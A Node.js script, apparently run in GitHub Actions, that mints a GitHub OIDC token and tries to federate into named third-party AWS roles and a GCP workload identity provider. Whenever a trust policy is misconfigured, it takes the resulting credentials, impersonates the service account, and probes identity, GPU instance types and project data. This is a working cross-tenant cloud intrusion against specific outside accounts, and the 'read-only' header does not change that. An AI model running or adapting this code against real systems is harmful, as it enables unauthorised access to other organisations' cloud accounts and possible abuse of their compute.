// c211-i123290 : verify 3 NEW federation pairs (2 AWS roles, 1 GCP WIF provider+SA)
// Mints a GitHub OIDC token from THIS repo/ref (no secrets needed), tests each declared
// federation target verbatim, prints one C211R line per pair. Read-only; creates nothing.
const https = require('https');
const crypto = require('crypto');

const PAYLOAD = {
  aws: [
    { arn: 'arn:aws:iam::840432317544:role/github-actions-deploy-role', repo: 'Revanth0749/mlflow-setup', path: '.github/workflows/terraform-apply.yml' },
    { arn: 'arn:aws:iam::199061575177:role/github-actions-deploy-001', repo: 'healthdots-jzhu/portfolio', path: '.github/workflows/0.2-onetime-provision-github-oidc-secrets-variables.yml' }
  ],
  // last-char-tampered control of the first ARN
  ctl_arn: 'arn:aws:iam::840432317544:role/github-actions-deploy-rolf',
  gcp: [
    { provider: 'projects/426265110888/locations/global/workloadIdentityPools/github-actions/providers/opentargets',
      sa: 'github-actions@open-targets-eu-dev.iam.gserviceaccount.com',
      repo: 'opentargets/platform-mcp', path: '.github/workflows/main.yaml' }
  ]
};

function req(url, opts, body) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const o = Object.assign({ hostname: u.hostname, port: 443, path: u.pathname + u.search, method: 'GET' }, opts || {});
    const r = https.request(o, (res) => {
      let d = '';
      res.on('data', (c) => (d += c));
      res.on('end', () => resolve({ status: res.statusCode, body: d }));
    });
    r.on('error', (e) => resolve({ status: -1, body: String(e) }));
    if (body) r.write(body);
    r.end();
  });
}

async function mint(aud) {
  const base = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!base) return null;
  const sep = base.indexOf('?') >= 0 ? '&' : '?';
  const r = await req(base + sep + 'audience=' + encodeURIComponent(aud), { headers: { Authorization: 'bearer ' + tok } });
  if (r.status !== 200) return null;
  try { return JSON.parse(r.body).value; } catch (e) { return null; }
}

function jwtClaims(t) {
  try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString('utf8')); } catch (e) { return {}; }
}
function brief(s, n) { return String(s || '').slice(0, n || 300).replace(/\s+/g, ' '); }
function tag(t) {
  if (!t) return { len: 0 };
  return { len: t.length, sha256_12: crypto.createHash('sha256').update(t).digest('hex').slice(0, 12), dots: (t.match(/\./g) || []).length };
}
function form(o) { return Object.keys(o).map((k) => encodeURIComponent(k) + '=' + encodeURIComponent(o[k])).join('&'); }
function xmlTag(xml, tag) { const m = xml.match(new RegExp('<' + tag + '>([^<]*)</' + tag + '>')); return m ? m[1] : null; }

// ---- minimal SigV4 for STS GetCallerIdentity + EC2 query calls ----
function hmac(key, data) { return crypto.createHmac('sha256', key).update(data, 'utf8').digest(); }
function sha256hex(s) { return crypto.createHash('sha256').update(s, 'utf8').digest('hex'); }
async function sigv4Query(creds, service, region, host, params) {
  const body = form(params);
  const t = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
  const date = t.slice(0, 8);
  const headers = { 'content-type': 'application/x-www-form-urlencoded; charset=utf-8', host: host, 'x-amz-date': t };
  if (creds.SessionToken) headers['x-amz-security-token'] = creds.SessionToken;
  const signed = Object.keys(headers).sort();
  const canonicalHeaders = signed.map((h) => h + ':' + headers[h].trim() + '\n').join('');
  const signedHeaders = signed.join(';');
  const canonicalRequest = ['POST', '/', '', canonicalHeaders, signedHeaders, sha256hex(body)].join('\n');
  const scope = date + '/' + region + '/' + service + '/aws4_request';
  const sts = ['AWS4-HMAC-SHA256', t, scope, sha256hex(canonicalRequest)].join('\n');
  let k = hmac('AWS4' + creds.SecretAccessKey, date);
  k = hmac(k, region); k = hmac(k, service); k = hmac(k, 'aws4_request');
  const sig = crypto.createHmac('sha256', k).update(sts, 'utf8').digest('hex');
  headers.Authorization = 'AWS4-HMAC-SHA256 Credential=' + creds.AccessKeyId + '/' + scope + ', SignedHeaders=' + signedHeaders + ', Signature=' + sig;
  // fetch needs the exact headers that were signed (host is implicit but identical)
  const r = await fetch('https://' + host + '/', { method: 'POST', headers: headers, body: body });
  return { status: r.status, body: await r.text() };
}

(async () => {
  const repo = process.env.GITHUB_REPOSITORY, ref = process.env.GITHUB_REF, sha = process.env.GITHUB_SHA;
  console.log('C211R_REPO ' + repo + ' ' + ref + ' ' + sha);

  // ---------- AWS ----------
  const awsTok = await mint('sts.amazonaws.com');
  if (!awsTok) {
    console.log('C211R_RESULT ' + JSON.stringify({ cloud: 'aws', http: 'mint_failed' }));
  } else {
    const cl = jwtClaims(awsTok);
    console.log('C211R_AWS_SUB ' + cl.sub + ' aud=' + cl.aud + ' ' + JSON.stringify(tag(awsTok)));
    const targets = PAYLOAD.aws.map((p) => ({ arn: p.arn, repo: p.repo, path: p.path, ctl: false }));
    targets.push({ arn: PAYLOAD.ctl_arn, repo: PAYLOAD.aws[0].repo, path: PAYLOAD.aws[0].path, ctl: true });
    for (const p of targets) {
      const r = await req('https://sts.amazonaws.com/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
        form({ Action: 'AssumeRoleWithWebIdentity', Version: '2011-06-15', RoleArn: p.arn, RoleSessionName: 'c211i123290', WebIdentityToken: awsTok }));
      const rec = { cloud: 'aws', target: p.arn, control: p.ctl, repo: p.repo, path: p.path, http: r.status, body: brief(r.body, 300) };
      if (r.status === 200) {
        const creds = { AccessKeyId: xmlTag(r.body, 'AccessKeyId'), SecretAccessKey: xmlTag(r.body, 'SecretAccessKey'), SessionToken: xmlTag(r.body, 'SessionToken') };
        rec.assumed_arn = xmlTag(r.body, 'Arn');
        rec.creds_tag = { ak: creds.AccessKeyId ? creds.AccessKeyId.slice(0, 4) + '…' : null, st_len: (creds.SessionToken || '').length };
        try {
          const gci = await sigv4Query(creds, 'sts', 'us-east-1', 'sts.amazonaws.com', { Action: 'GetCallerIdentity', Version: '2011-06-15' });
          rec.gci_http = gci.status; rec.gci_body = brief(gci.body, 400);
          const ec2 = await sigv4Query(creds, 'ec2', 'us-east-1', 'ec2.us-east-1.amazonaws.com',
            { Action: 'DescribeInstanceTypes', Version: '2016-11-15', 'InstanceType.1': 'g6.xlarge', 'InstanceType.2': 'g5.xlarge', 'InstanceType.3': 'p4d.24xlarge' });
          rec.ec2_http = ec2.status; rec.ec2_body = brief(ec2.body, 500);
        } catch (e) { rec.escalation_err = String(e).slice(0, 200); }
      }
      console.log('C211R_RESULT ' + JSON.stringify(rec));
    }
  }

  // ---------- GCP ----------
  for (const p of PAYLOAD.gcp) {
    const aud = '//iam.googleapis.com/' + p.provider;
    const t = await mint(aud);
    if (!t) { console.log('C211R_RESULT ' + JSON.stringify({ cloud: 'gcp', provider: p.provider, http: 'mint_failed' })); continue; }
    const body = JSON.stringify({ audience: aud, grantType: 'urn:ietf:params:oauth:grant-type:token-exchange',
      requestedTokenType: 'urn:ietf:params:oauth:token-type:access_token', subjectToken: t,
      subjectTokenType: 'urn:ietf:params:oauth:token-type:jwt', scope: 'https://www.googleapis.com/auth/cloud-platform' });
    const r = await req('https://sts.googleapis.com/v1/token', { method: 'POST', headers: { 'Content-Type': 'application/json' } }, body);
    const rec = { cloud: 'gcp', provider: p.provider, sa: p.sa, repo: p.repo, path: p.path, sub_tok: tag(t), sts_http: r.status, sts_body: brief(r.body, 300) };
    if (r.status === 200) {
      let at = null;
      try { at = JSON.parse(r.body).access_token; } catch (e) {}
      rec.fed_tok = tag(at);
      if (at && p.sa) {
        const r2 = await req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/' + encodeURIComponent(p.sa) + ':generateAccessToken',
          { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer ' + at } },
          JSON.stringify({ scope: ['https://www.googleapis.com/auth/cloud-platform'], lifetime: '600s' }));
        rec.imp_http = r2.status; rec.imp_body = brief(r2.body, 300);
        if (r2.status === 200) {
          let sat = null;
          try { sat = JSON.parse(r2.body).accessToken; } catch (e) {}
          rec.sa_tok = tag(sat);
          if (sat) {
            const r3 = await req('https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=' + encodeURIComponent(sat));
            rec.sa_tokeninfo_http = r3.status; rec.sa_tokeninfo = brief(r3.body, 300);
            const proj = p.provider.split('/')[1];
            const r4 = await req('https://cloudresourcemanager.googleapis.com/v1/projects/' + proj, { headers: { Authorization: 'Bearer ' + sat } });
            rec.crm_http = r4.status; rec.crm_body = brief(r4.body, 300);
          }
        }
      }
    }
    console.log('C211R_RESULT ' + JSON.stringify(rec));
  }
  console.log('C211R_DONE');
})();
